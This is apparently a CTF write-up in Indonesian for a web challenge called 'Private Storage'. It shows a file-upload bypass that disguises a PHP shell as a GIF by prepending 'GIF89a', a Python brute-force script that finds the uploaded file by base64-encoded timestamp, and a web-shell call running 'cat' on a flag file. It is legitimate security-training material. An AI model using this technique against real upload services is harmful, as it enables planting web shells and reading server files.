# __ASGama CTF__ 
## _Private Storage_

## Information
**Category:** | **Points:** | **Writeup Author**
--- | --- | ---
Web | 200 | l0l

**Description:** 

> http://ctf.asgama.web.id:41003


### Private Storage
Setelah beberapa lama recon. Ditemukan beberapa petunjuk :  
1. Service hanya menerima image.
2. Disimpan dalam sebuah folder berupa base64 dari timestamp upload file.
3. File tanpa extensi ( misal `a` akan direname menjadi `hash`.a)
4. Deteksi gambar melalui headernya saja.

Setelah upload file kita dapat membuka file tersebut dari dashboard kita, jika file extensinya gambar, maka dapat dibuka dan url yang ditampilkan adalah url asli dari file tersebut di server. Namun jika tidak, maka service akan memaksa kita untuk download tanpa memperlihatkan dimana letak file tersebut.

Maka kita cukup melakukan beberapa hal:  
1. Buat akun agar dapat upload.
2. Upload file image normal, buka image tersebut lalu simpan addressnya.
3. Siapkan file shell, lalu ubah header nya menjadi gambar. Misal GIF, tambahkan "GIF89a" di awal file.
4. Upload lalu catat nama filenya. 
5. Cari file php yang di upload dengan brute force berdasarkan timestamp file gambar yang berhasil diupload.

### Payload
```py
from requests import *
from sys import stdout
__URL__ = "http://ctf.asgama.web.id:41003/storages/"
filename = "/b7f246b1d77c289fe8143ef48201ab40.php"

limit = int("MTU0NjEwMzEyMw==".decode("base64")) # time stamp dari file image normal
flag = False

while not flag:
    stdout.flush()
    stdout.write("\r"+str(limit))
    r = get("{}{}{}".format(__URL__,str(limit).encode('base64')[:-1],filename))

    if (r.status_code == 200):
        __URL__ = "{}{}{}".format(__URL__,str(limit).encode('base64')[:-1],filename)
        print __URL__
        flag = True
    limit+=1
```

### Result
```
```

### Flag

# http://ctf.asgama.web.id:41003/storages/MTU0NjEwMzEyMw==/b7f246b1d77c289fe8143ef48201ab40.php
# http://ctf.asgama.web.id:41003/storages/MTU0NjEwMzEyMw==/b7f246b1d77c289fe8143ef48201ab40.php?cmd=cat ../../storages/bendera/flag.txt
# ASGama{dont_forget_to_rename_file_extension}